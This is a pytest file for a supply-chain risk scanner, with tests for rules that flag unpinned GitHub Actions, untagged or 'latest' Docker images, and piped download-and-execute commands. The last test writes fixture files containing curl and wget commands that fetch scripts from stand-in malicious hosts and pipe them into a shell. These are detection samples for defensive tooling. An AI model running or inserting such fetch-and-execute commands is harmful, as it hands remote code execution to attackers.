import pytest
from pathlib import Path
from oss_risk_agent.rules.category_b_supplychain import (
    B1UnpinnedActionsRule,
    B2DockerLatestRule,
    B3DirectExecutionRule
)
from oss_risk_agent.core.models import Severity

def test_b1_unpinned_actions_rule(dummy_repo: Path):
    rule = B1UnpinnedActionsRule()
    workflow_dir = dummy_repo / ".github" / "workflows"
    
    # Bad workflow (using tag)
    bad_yml = workflow_dir / "bad.yml"
    bad_yml.write_text('''
jobs:
  build:
    steps:
      - uses: actions/checkout@v3
''', encoding="utf-8")

    # Good workflow (using SHA)
    good_yml = workflow_dir / "good.yml"
    good_yml.write_text('''
jobs:
  build:
    steps:
      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
''', encoding="utf-8")

    risks = rule.analyze(dummy_repo)
    
    assert len(risks) == 1
    assert risks[0].category == "B-1"
    assert risks[0].severity == Severity.HIGH
    assert risks[0].target_file == str(Path(".github/workflows/bad.yml"))

def test_b2_docker_latest_rule(dummy_repo: Path):
    rule = B2DockerLatestRule()
    
    (dummy_repo / "Dockerfile.bad1").write_text("FROM node:latest\nCMD [\"npm\", \"start\"]", encoding="utf-8")
    (dummy_repo / "Dockerfile.bad2").write_text("FROM python\nCMD [\"python\", \"app.py\"]", encoding="utf-8")
    (dummy_repo / "Dockerfile.good").write_text("FROM golang:1.20-alpine\nCMD [\"go\", \"run\", \"main.go\"]", encoding="utf-8")
    
    risks = rule.analyze(dummy_repo)
    
    assert len(risks) == 2
    for risk in risks:
        assert risk.category == "B-2"
        assert risk.severity == Severity.HIGH

def test_b3_direct_execution_rule(dummy_repo: Path):
    rule = B3DirectExecutionRule()
    
    # 1. Text-based detection (sh script)
    (dummy_repo / "install.sh").write_text("curl -sL https://evil.com/script.sh | bash", encoding="utf-8")
    
    # 2. Python AST detection
    (dummy_repo / "app.py").write_text("import os\nos.system('wget -O- http://malicious.com | zsh')", encoding="utf-8")
    
    risks = rule.analyze(dummy_repo)
    
    assert len(risks) >= 2
    for risk in risks:
        assert risk.category == "B-3"
        assert risk.severity == Severity.CRITICAL
        assert "curl" in risk.evidence or "wget" in risk.evidence
